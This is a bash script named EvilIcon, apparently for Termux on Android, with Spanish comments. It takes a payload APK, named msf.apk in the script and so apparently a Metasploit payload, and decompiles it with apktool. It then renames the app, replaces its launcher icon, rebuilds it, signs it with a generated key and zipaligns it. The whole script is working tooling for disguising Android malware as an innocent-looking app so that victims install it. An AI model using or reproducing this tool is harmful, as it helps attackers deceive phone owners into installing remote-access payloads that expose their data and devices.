#!/bin/bash
#
# ┌═════════════════════════════┐
# █ WHITE HACKS ©2021 - Darkmux █
# └═════════════════════════════┘
#
# [Open Source] - [Código Abierto]
#
# EvilIcon: (06/04/2021)
#
# ==========================================
#                 VARIABLES
# ==========================================
PWD=$(pwd)
FIND='<application android:label="@string/app_name">'
LINE='<application android:label="@string/app_name"android:icon="@drawable/ic_launcher">'
# ==========================================
#             COLORES RESALTADOS
# ==========================================
negro="\e[1;30m"
azul="\e[1;34m"
verde="\e[1;32m"
cian="\e[1;36m"
rojo="\e[1;31m"
purpura="\e[1;35m"
amarillo="\e[1;33m"
blanco="\e[1;37m"
# ==========================================
#               COLORES BAJOS
# ==========================================
black="\e[0;30m"
blue="\e[0;34m"
green="\e[0;32m"
cyan="\e[0;36m"
red="\e[0;31m"
purple="\e[0;35m"
yellow="\e[0;33m"
white="\e[0;37m"
# ==========================================
#          INSTALANDO DEPENDENCIAS
# ==========================================
Dependencies(){
	if [ -x /bin/apksigner ]; then
		PWD=$(pwd)
	else
		apt-get install apksigner -y
	fi
	if [ -x /bin/apktool ]; then
		PWD=$(pwd)
	else
		apt-get install apktool -y
	fi
	if [ -x /bin/zipalign ]; then
		PWD=$(pwd)
	else
		apt-get install zipalign -y
	fi
	if [ -x /bin/convert ]; then
		PWD=$(pwd)
	else
		apt-get install imagemagick -y
	fi
}
# ==========================================
#              BANNER EVILICON
# ==========================================
EvilIcon(){
	sleep 0.5
	clear
echo -e "${negro}
███████╗██╗   ██╗██╗██╗     ██╗ ██████╗ ██████╗ ███╗   ██╗
██╔════╝██║   ██║██║██║     ██║██╔════╝██╔═══██╗████╗  ██║
█████╗  ██║   ██║██║██║     ██║██║     ██║   ██║██╔██╗ ██║
██╔══╝  ╚██╗ ██╔╝██║██║     ██║██║     ██║   ██║██║╚██╗██║
███████╗ ╚████╔╝ ██║███████╗██║╚██████╗╚██████╔╝██║ ╚████║
╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝"${blanco}
}
# ==========================================
#        SOLICITANDO RUTA DEL PAYLOAD
# ==========================================
Payload(){
echo -e -n "${negro}
┌═══════════════════════════════┐
█ ${verde}INGRESE LA RUTA DE SU PAYLOAD ${negro}█
└═══════════════════════════════┘
┃
└═>>> "${blanco}
read -r PAYLOAD
}
# ==========================================
#         SOLICITANDO RUTA DEL ÍCONO
# ==========================================
Icon(){
echo -e -n "${negro}
┌═════════════════════════════┐
█ ${verde}INGRESE LA RUTA DE SU ÍCONO ${negro}█
└═════════════════════════════┘
┃
└═>>> "${blanco}
read -r ICON
}
# ==========================================
#       SOLICITANDO NOMBRE DEL PAYLOAD
# ==========================================
NameApp(){
echo -e -n "${negro}
┌═══════════════════════════════════┐
█ ${verde}INGRESE UN NOMBRE PARA SU PAYLOAD ${negro}█
└═══════════════════════════════════┘
┃
└═>>> "${blanco}
read -r NAMEAPP
}
# ==========================================
#       CREANDO DIRECTORIO DE TRABAJO
# ==========================================
Directory(){
	if [ -d /storage/emulated/0/EvilIcon ]; then
		rm -rf /storage/emulated/0/EvilIcon
		mkdir -p /storage/emulated/0/EvilIcon
	else
		mkdir -p /storage/emulated/0/EvilIcon
	fi
}
# ==========================================
#      ORGANIZANDO ARCHIVOS DE TRABAJO
# ==========================================
Filework(){
	cp ${PAYLOAD} /storage/emulated/0/EvilIcon/msf.apk
	cp ${ICON} /storage/emulated/0/EvilIcon
	cd /storage/emulated/0/EvilIcon
}
# ==========================================
#  TRANSFORMANDO FORMATO DE IMAGEN A (.png)
# ==========================================
Convert(){
	ICONAME=$(basename ${ICON})
	convert ${ICONAME} ic_launcher.png
}
# ==========================================
#        DESCOMPILANDO PAYLOAD (.apk)
# ==========================================
Decompile(){
	apktool d msf.apk
	cd msf/res/values
}
# ==========================================
#        CAMBIANDO NOMBRE DEL PAYLOAD
# ==========================================
Changename(){
	sed -i "s/MainActivity/${NAMEAPP}/g" strings.xml
}
# ==========================================
#       CREANDO DIRECTORIOS DE TRABAJO
# ==========================================
Folders(){
	cd ..
	mkdir drawable-hdpi-v4 drawable-mdpi-v4 drawable-xhdpi-v4 drawable-xxhdpi-v4
	cd ..
}
# ==========================================
#       AGREGANDO ÍCONO A DIRECTORIOS
# ==========================================
Adding(){
	cp /storage/emulated/0/EvilIcon/ic_launcher.png /storage/emulated/0/EvilIcon/msf/res/drawable-hdpi-v4
	cp /storage/emulated/0/EvilIcon/ic_launcher.png /storage/emulated/0/EvilIcon/msf/res/drawable-mdpi-v4
	cp /storage/emulated/0/EvilIcon/ic_launcher.png /storage/emulated/0/EvilIcon/msf/res/drawable-xhdpi-v4
	cp /storage/emulated/0/EvilIcon/ic_launcher.png /storage/emulated/0/EvilIcon/msf/res/drawable-xxhdpi-v4
}
# ==========================================
#        CAMBIANDO ÍCONO DEL PAYLOAD
# ==========================================
ChangeIcon(){
	sed -i "s!${FIND}!${LINE}!" AndroidManifest.xml
	cd ..
}
# ==========================================
#       COMPILANDO ARCHIVOS EN (.apk)
# ==========================================
BuildAPK(){
	apktool b msf -o payload.apk
}
# ==========================================
#       FIRMANDO ARCHIVOS DEL PAYLOAD
# ==========================================
ApkSigner(){
	keytool -genkey -v -keystore msf.keystore -alias msf -keyalg RSA -keysize 2048 -validity 10000
	apksigner sign --ks msf.keystore payload.apk
	apksigner verify --verbose payload.apk
}
# ==========================================
#      GENERANDO APLICACIÓN DEFINITIVA
# ==========================================
ApkGenerator(){
	zipalign -v 4 payload.apk ${NAMEAPP}.apk
echo -e "${negro}
┌════════════════════════════┐
█ ${verde}APK GENERADA CORRECTAMENTE ${negro}█
└════════════════════════════┘
┃
└═>>>${blanco} /storage/emulated/0/EvilIcon/${NAMEAPP}.apk
"
}
# ==========================================
#            DECLARANDO FUNCIONES
# ==========================================
Dependencies
EvilIcon
Payload
Icon
NameApp
Directory
Filework
Convert
Decompile
Changename
Folders
Adding
ChangeIcon
BuildAPK
ApkSigner
ApkGenerator
